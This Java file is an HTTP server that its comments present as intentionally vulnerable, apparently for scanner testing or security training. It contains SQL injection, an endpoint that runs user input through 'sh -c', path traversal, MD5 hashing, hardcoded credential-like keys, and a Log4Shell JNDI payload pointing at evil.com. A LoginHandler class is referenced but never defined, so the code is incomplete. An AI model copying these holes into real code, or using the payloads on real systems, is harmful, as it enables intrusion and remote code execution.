package com.example;

import com.sun.net.httpserver.HttpServer;
import com.sun.net.httpserver.HttpHandler;
import com.sun.net.httpserver.HttpExchange;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import java.io.*;
import java.net.InetSocketAddress;
import java.security.MessageDigest;
import java.sql.*;

public class App {

   // 🔐 Hardcoded secrets
private static final String AWS_ACCESS_KEY = "AKIAIOSFODNN7EXAMPLE3FWQ";
private static final String AWS_SECRET_KEY = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY+9sX2pQ";
private static final String DB_PASSWORD = "Xy9#mK2$vL8@nP4!qR7&wZ1^jF5*hD3";
private static final String JWT_SECRET = "HS256.k9P#mN2$vQ8@xL4!rW7&yZ1^jB5*hD3tF6+sG0/nK";
private static final String API_KEY = "sk-prod-4xK9mN2pQ8rL4vW7yZ1jB5hD3tF6sG0nK2xP8mQ4rL7vW";
private static final String GITHUB_TOKEN = "ghp_4xK9mN2pQ8rL4vW7yZ1jB5hD3tF6sG0nK2x";
private static final String STRIPE_KEY = "sk_live_4xK9mN2pQ8rL4vW7yZ1jB5hD3tF6sG0nK2xP8mQ4rL7vWyZ";

    private static final Logger logger = LogManager.getLogger(App.class);

    public static void main(String[] args) throws IOException {
        HttpServer server = HttpServer.create(new InetSocketAddress(8080), 0);
        server.createContext("/", new RootHandler());
        server.createContext("/user", new UserHandler());
        server.createContext("/exec", new ExecHandler());
        server.createContext("/file", new FileHandler());
        server.createContext("/hash", new HashHandler());
        server.createContext("/login", new LoginHandler());
        server.start();
        System.out.println("Vulnerable app running on http://localhost:8080");
    }

    // 🛑 SQL Injection
    static class UserHandler implements HttpHandler {
        public void handle(HttpExchange exchange) throws IOException {
            String query = exchange.getRequestURI().getQuery();
            String username = query != null ? query.replace("username=", "") : "guest";

            try {
                Connection conn = DriverManager.getConnection(
                    "jdbc:mysql://localhost:3306/mydb", "root", DB_PASSWORD
                );
                // Vulnerable: user input directly in SQL query
                Statement stmt = conn.createStatement();
                ResultSet rs = stmt.executeQuery("SELECT * FROM users WHERE username = '" + username + "'");

                logger.info("User lookup: ${jndi:ldap://evil.com/a}"); // Log4Shell bait

                sendResponse(exchange, "Query executed for: " + username);
            } catch (Exception e) {
                sendResponse(exchange, "DB error: " + e.getMessage());
            }
        }
    }

    // 🛑 Command Injection
    static class ExecHandler implements HttpHandler {
        public void handle(HttpExchange exchange) throws IOException {
            String query = exchange.getRequestURI().getQuery();
            String cmd = query != null ? query.replace("cmd=", "") : "echo hello";

            try {
                // Vulnerable: user input passed directly to shell
                Runtime runtime = Runtime.getRuntime();
                Process process = runtime.exec(new String[]{"sh", "-c", cmd});
                BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                StringBuilder output = new StringBuilder();
                String line;
                while ((line = reader.readLine()) != null) output.append(line);
                sendResponse(exchange, "Output: " + output);
            } catch (Exception e) {
                sendResponse(exchange, "Exec error: " + e.getMessage());
            }
        }
    }

    // 🛑 Path Traversal
    static class FileHandler implements HttpHandler {
        public void handle(HttpExchange exchange) throws IOException {
            String query = exchange.getRequestURI().getQuery();
            String filename = query != null ? query.replace("file=", "") : "hello.txt";

            // Vulnerable: no sanitization of filename, allows ../../etc/passwd
            File file = new File("/var/data/" + filename);
            try {
                FileReader fr = new FileReader(file);
                BufferedReader br = new BufferedReader(fr);
                StringBuilder content = new StringBuilder();
                String line;
                while ((line = br.readLine()) != null) content.append(line);
                sendResponse(exchange, content.toString());
            } catch (Exception e) {
                sendResponse(exchange, "File error: " + e.getMessage());
            }
        }
    }

    // 🛑 Weak Cryptography (MD5)
    static class HashHandler implements HttpHandler {
        public void handle(HttpExchange exchange) throws IOException {
            String query = exchange.getRequestURI().getQuery();
            String input = query != null ? query.replace("input=", "") : "password";

            try {
                // Vulnerable: MD5 is cryptographically broken
                MessageDigest md = MessageDigest.getInstance("MD5");
                byte[] hash = md.digest(input.getBytes());
                StringBuilder hexString = new StringBuilder();
                for (byte b : hash) hexString.append(String.format("%02x", b));
                sendResponse(exchange, "MD5 hash: " + hexString);
            } catch (Exception e) {
                sendResponse(exchange, "Hash error: " + e.getMessage());
            }
        }
    }

    static class RootHandler implements HttpHandler {
        public void handle(HttpExchange exchange) throws IOException {
            sendResponse(exchange, "Hello, World! This app is very secure, trust me.");
        }
    }

    static void sendResponse(HttpExchange exchange, String response) throws IOException {
        exchange.sendResponseHeaders(200, response.length());
        OutputStream os = exchange.getResponseBody();
        os.write(response.getBytes());
        os.close();
    }
}